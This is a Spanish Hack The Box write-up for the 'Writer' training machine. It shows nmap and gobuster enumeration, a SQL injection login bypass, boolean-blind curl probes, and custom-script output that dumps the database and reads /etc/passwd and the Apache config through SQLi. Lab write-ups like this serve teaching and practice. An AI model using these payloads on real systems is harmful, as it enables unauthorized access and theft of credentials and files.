<!doctype html><html lang="es"><head><title>Writer | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/Writer/Writer.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Writer/Writer.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Writer/Writer.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Writer"><meta property="twitter:title" content="Writer"><meta property="og:title" content="Writer"><meta property="og:url" content="https://7rocky.github.io/htb/writer/"><meta itemprop="keywords" content="smb,flask,smtp,cronjob,file-permissions,command-injection,sqli,static-code-analysis,password-reuse,rce,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/writer/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/writer/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/writer/&text=Writer" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/writer/&title=Writer" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Writer</h1><time class="mt4 f6 dib tracked" datetime="2021-12-11T00:00:00+01:00">11 / 12 / 2021</time><br><p class="mb4 f6 dib tracked">18 minutos de lectura</p></header><div class="htb-image"><img alt="Writer" src="/images/HTB/Writer/Writer.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/smb" title="SMB">SMB</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/flask" title="Flask">Flask</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/smtp" title="SMTP">SMTP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cronjob" title="Tareas Cron">Tareas Cron</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-permissions" title="Permisos de archivos">Permisos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/command-injection" title="Inyección de Comandos">Inyección de Comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sqli" title="Inyección de código SQL">Inyección de código SQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/static-code-analysis" title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de hashes de contraseñas">Descifrado de hashes de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#encontrando-una-inyección-de-código-sql">Encontrando una inyección de código SQL</a><ul><li><a href="#leyendo-archivos-mediante-sqli">Leyendo archivos mediante SQLi</a></li></ul></li><li><a href="#análisis-del-código-python">Análisis del código Python</a><ul><li><a href="#enumeración-por-smb">Enumeración por SMB</a></li></ul></li><li><a href="#acceso-en-la-máquina">Acceso en la máquina</a></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-john">Movimiento lateral al usuario <code>john</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.101</li><li><strong>Fecha</strong>: 31 / 07 / 2021</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.11.101 -p 22,80,139,445
Nmap scan report for 10.10.11.101
Host is up (0.050s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 13m06s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)  
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date:
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 14.60 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP), 139 y 445 (SMB).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.101</code> veremos un <em>blog</em> como este:</p><p><img src="/images/HTB/Writer/Writer-blog.png" alt="Writer blog"></p><p>El <em>blog</em> contiene algunos artículos, pero nada interesante. Podemos utilizar <code>gobuster</code> para aplicar <em>fuzzing</em> de rutas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gobuster</span> dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -u http://10.10.11.101  
/contact             <span class="code-dark-green"> (Status: 200)</span> [Size: 4905]
/about               <span class="code-dark-green"> (Status: 200)</span> [Size: 3522]
/static              <span class="code-dark-cyan"> (Status: 301)</span> [Size: 313]<span class="code-dark-blue"> [--&gt; http://10.10.11.101/static/]</span>
/logout              <span class="code-dark-cyan"> (Status: 302)</span> [Size: 208]<span class="code-dark-blue"> [--&gt; http://10.10.11.101/]</span>
/dashboard           <span class="code-dark-cyan"> (Status: 302)</span> [Size: 208]<span class="code-dark-blue"> [--&gt; http://10.10.11.101/]</span>
/administrative      <span class="code-dark-green"> (Status: 200)</span> [Size: 1443]
/server-status       <span class="code-dark-yellow"> (Status: 403)</span> [Size: 277]
</code></pre></div><p>Como vemos, hay una ruta llamada <code>/administrative</code>:</p><p><img src="/images/HTB/Writer/Writer-administrative.png" alt="Writer administrative"></p><p>Podemos probar algunas credenciales por defecto (<code>admin:admin</code>, <code>root:password</code>, etc.), pero ninguna funciona.</p><h2 id="encontrando-una-inyección-de-código-sql">Encontrando una inyección de código SQL</h2><p>El formulario de inicio de sesión de <code>/administrative</code> es vulnerable a inyección de código SQL (SQLi). Utilizando una inyección sencilla (o sea: <code>' or 1=1-- -</code>) podemos saltar la autenticación y acceder al panel de administración:</p><p><img src="/images/HTB/Writer/Writer-dashboard.png" alt="Writer dashboard"></p><p>En este punto, podemos utilizar el SQLi para obtener el contenido de la base de datos. Nótese que se trata de un SQLi de tipo <em>Boolean-based blind</em> (si la respuesta del servidor muestra un error es porque la consulta SQL ha resultado en <code>false</code>; pero si la respuesta del servidor es exitosa, entonces la consulta SQL ha resultado en <code>true</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.101/administrative -sd <span class="code-dark-yellow">"uname=' or 1=1-- -&password=x"</span> | <span class="code-dark-green">grep</span> error

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.11.101/administrative -sd <span class="code-dark-yellow">"uname=' or 1=2-- -&password=x"</span> | <span class="code-dark-green">grep</span> error
        &lt;p class="<span class="code-red">error</span>" style="color:red"&gt;&lt;strong style="color:red"&gt;Error:&lt;/strong&gt; Incorrect credentials supplied &lt;/p&gt;  
</code></pre></div><p>Con esto, se puede obtener el contenido de un campo carácter a carácter, de manera que se itera sobre todos los caracteres ASCII imprimibles hasta dar con el correcto para una posición de un determinado campo. Por este motivo, para la extracción es conveniente utilizar un <em>script</em> automático o una herramienta como <code>sqlmap</code>.</p><p>Podemos obtener algunos campos de las tablas de la base de datos utilizando un <em>script</em> personalizado en Python llamado <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer/sqli.py"><code>sqli.py</code></a> que utiliza el algoritmo de Búsqueda Binaria para extraer los datos más rápidamente (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Writer#sqlipy">aquí</a>).</p><p>Aquí podemos ver algunos de los contenidos en formato JSON (la tabla <code>stories</code> y las columnas <code>ganalitics</code> y <code>date_created</code> se han omitido porque contenían muchos datos inútiles):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">sqli.py</span>
Version: 10.3.29-MariaDB-0ubuntu0.20.04.1
{
  "writer": {
    "site": {
      "id": [
        "1"
      ],
      "title": [
        "Story Bank"
      ],
      "description": [
        "This is a site where I publish my own and others stories"  
      ],
      "logo": [
        "/img/logo.png"
      ],
      "favicon": [
        "/img/favicon.ico"
      ],
      "ganalytics": []
    },
    "stories": {},
    "users": {
      "id": [
        "1"
      ],
      "username": [
        "admin"
      ],
      "password": [
        "118e48794631a9612484ca8b55f622d0"
      ],
      "email": [
        "admin@writer.htb"
      ],
      "status": [
        "Active"
      ],
      "date_created": []
    }
  }
}
Time: 135.14384365081787 s
</code></pre></div><p>Aparece el <em>hash</em> de una contraseña, pero no es rompible mediante <code>john</code> o <code>hashcat</code>.</p><h3 id="leyendo-archivos-mediante-sqli">Leyendo archivos mediante SQLi</h3><p>Si verificamos los privilegios del usuario de la base de datos, vemos que podemos leer y escribir en archivos (privilegio llamado <code>FILE</code>) si el usuario a nivel de sistema tiene los permisos necesarios:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">sqli.py</span> privileges  
User: admin@localhost
{
  "grantee": [
    "'admin'@'localhost'"
  ],
  "privilege_type": [
    "FILE"
  ],
  "table_catalog": [
    "def"
  ],
  "is_grantable": [
    "NO"
  ]
}
Time: 23.135270833969116 s
</code></pre></div><p>Como prueba de concepto, podemos leer el archivo <code>/etc/passwd</code>. Esto muestra que hay dos usuarios de bajos privilegios en la máquina: <code>kyle</code> y <code>john</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">sqli.py</span> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
</code></pre></div><p>Podemos continuar enumerando archivos del servidor. Sería increíble si pudiéramos leer el código fuente del <em>back-end</em>. Para ello, primero podemos buscar la configuración del servidor (normalmente un Apache o nginx).</p><p>De hecho, el archivo <code>/etc/apache2/sites-available/000-default.conf</code> existe y se muestra a continuación:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">sqli.py</span> /etc/apache2/sites-available/000-default.conf
# Virtual host configuration for writer.htb domain
&lt;VirtualHost *:80&gt;
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        &lt;Directory /var/www/writer.htb&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        Alias /static /var/www/writer.htb/writer/static
        &lt;Directory /var/www/writer.htb/writer/static/&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
&lt;/VirtualHost&gt;

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#&lt;VirtualHost 127.0.0.1:8080&gt;
#       ServerName dev.writer.htb
#       ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
#       Alias /static /var/www/writer2_project/static
#       &lt;Directory /var/www/writer2_project/static&gt;
#               Require all granted
#       &lt;/Directory&gt;
#
#       &lt;Directory /var/www/writer2_project/writerv2&gt;
#               &lt;Files wsgi.py&gt;
#                       Require all granted
#               &lt;/Files&gt;
#       &lt;/Directory&gt;
#
#       WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env  
#       WSGIProcessGroup writer2_project
#       WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#&lt;/VirtualHost&gt;
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
</code></pre></div><h2 id="análisis-del-código-python">Análisis del código Python</h2><p>La previa configuración de Apache apunta a un <em>script</em> principal del servidor que está en ejecución, que es <code>/var/www/writer.htb/writer.wsgi</code>, un archivo común para configurar una aplicación de Flask (que es un conocido <em>framework</em> web hecho en Python):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">sqli.py</span> /var/www/writer.htb/writer.wsgi  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/python</span>

<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">logging</span>
